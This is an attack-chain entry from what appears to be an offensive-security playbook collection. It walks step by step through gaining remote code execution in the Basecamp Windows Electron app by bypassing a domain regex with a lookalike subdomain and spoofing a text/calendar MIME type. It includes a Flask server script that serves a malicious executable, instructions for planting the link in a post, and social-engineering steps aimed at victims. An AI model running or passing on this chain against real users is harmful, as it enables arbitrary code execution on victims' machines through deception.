---
id: ac-basecamp-rce-subdomain-bypass
tags:
  - rce
  - electron
  - subdomain-bypass
  - mime-spoofing
  - basecamp
type: attack_chain
tools:
  - '[[tools/Flask]]'
tactics:
  - '[[Execution]]'
  - '[[Initial Access]]'
verified: false
platforms:
  - Windows
  - Electron
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Register-Malicious-Subdomain-for-Bypass]]'
  - '[[procedures/Setup-Flask-Server-for-Malicious-File]]'
  - '[[procedures/Embed-Crafted-URL-in-Basecamp-Post]]'
  - '[[procedures/Trigger-Download-and-Execution-via-User-Interaction]]'
step_count: 4
techniques:
  - '[[Malicious File]]'
  - '[[Remote File Copy]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:23:50.071Z'
description: >-
  Multi-stage attack exploiting weak regex validation and MIME type handling in
  the Basecamp Windows Electron app to achieve remote code execution by tricking
  users into downloading and executing a malicious file disguised as a calendar
  attachment.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Malicious File]]'
  - '[[Remote File Copy]]'
  - '[[Exploit Public-Facing Application]]'
---
# Remote Code Execution in Basecamp Windows Electron App via Subdomain Bypass and MIME Spoofing

Multi-stage attack chain demonstrating a complete attack workflow exploiting vulnerabilities in the Basecamp Windows Electron app's image download feature.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~10 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Register Subdomain] --> B[Setup Malicious Server]
    B --> C[Embed URL in Post]
    C --> D[User Interaction and RCE]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Flask]]

### Target Environment

- Basecamp Windows Electron App (version vulnerable to regex bypass)
- Required services/ports: HTTP server on port 80
- Network access requirements: Ability to register subdomains and host a server accessible via HTTP

### Initial Access Requirements

- Access to a Basecamp account to post content
- Victim using Basecamp desktop app on Windows
- No prior credentials needed beyond social engineering to get victim to click

## Detailed Attack Procedures

### Step 1: Register Malicious Subdomain
procedure: [[procedures/Register-Malicious-Subdomain-for-Bypass]]

**Objective**: Bypass the app's internal domain regex validation by registering a subdomain that mimics internal domains like launchpad.37signals.com.

**Instructions**: Register a domain you control and create a subdomain such as launchpad.dev.mydomain.com. This matches the flawed regex /(launchpad\.(?:dev|test))/ without being an actual internal domain.

**Expected Output**: Subdomain DNS records pointing to your controlled server.

**Success Indicators**:
- Subdomain resolves to your IP
- Regex test confirms bypass (e.g., via manual verification)

### Step 2: Setup Malicious Server
procedure: [[procedures/Setup-Flask-Server-for-Malicious-File]]

**Objective**: Host a malicious executable disguised with a text/calendar MIME type to trigger automatic execution upon download in the Electron app.

**Instructions**: Use [[commands/flask-serve-malicious-file]] to start a Flask server serving file.exe as an attachment with mimetype='text/calendar'.

```python
from flask import Flask, send_from_directory
app = Flask(__name__)
@app.route('/<path:path>')
def hello(path):
    return send_from_directory(".", "file.exe", as_attachment=True, mimetype="text/calendar")
if __name__ == '__main__':
    app.run(port=80,host="0.0.0.0")
```

Run the script on your server.

**Expected Output**: Server listening on port 80, responding with the file on requests.

**Success Indicators**:
- curl http://launchpad.dev.mydomain.com/file.exe returns Content-Type: text/calendar
- File downloads as attachment

### Step 3: Embed Crafted URL in Basecamp Post
procedure: [[procedures/Embed-Crafted-URL-in-Basecamp-Post]]

**Objective**: Place the malicious link in a Basecamp post or comment to lure the victim into clicking it within the desktop app.

**Instructions**: In your Basecamp account, create a post or comment embedding the URL http://launchpad.dev.mydomain.com/file.exe?attachment=true. Optionally, use invitation/ping emails to cross-account exploit by tricking users into joining your account.

**Expected Output**: Link visible in Basecamp interface.

**Success Indicators**:
- Link appears as an attachment in the post
- Victim can see and click it in the app

### Step 4: Trigger Download and Execution
procedure: [[procedures/Trigger-Download-and-Execution-via-User-Interaction]]

**Objective**: Achieve RCE when the victim clicks the link, bypassing checks and executing the malicious file due to MIME handling.

**Instructions**: Socially engineer the victim to open Basecamp and click the link. The app downloads and executes file.exe automatically for 'internal' URLs with executable MIME types like text/calendar.

**Expected Output**: Malicious executable runs on victim's Windows machine.

**Success Indicators**:
- File downloaded to victim's temp directory
- Process spawned from the executable (e.g., via task manager)

## Attack Chain Summary

### Key Achievements

1. Bypassed internal domain validation using subdomain trickery
2. Spoofed MIME type to force execution in Electron app
3. Achieved RCE without direct app compromise
4. Enabled cross-account exploitation via email invites

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Malicious File]] User Execution: Malicious File
- [[Remote File Copy]] Ingress Tool Transfer
- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### MITRE ATT&CK Tactics

- [[Execution]] Execution
- [[Initial Access]] Initial Access

---

*Last updated: 2023-10-01T00:00:00Z*
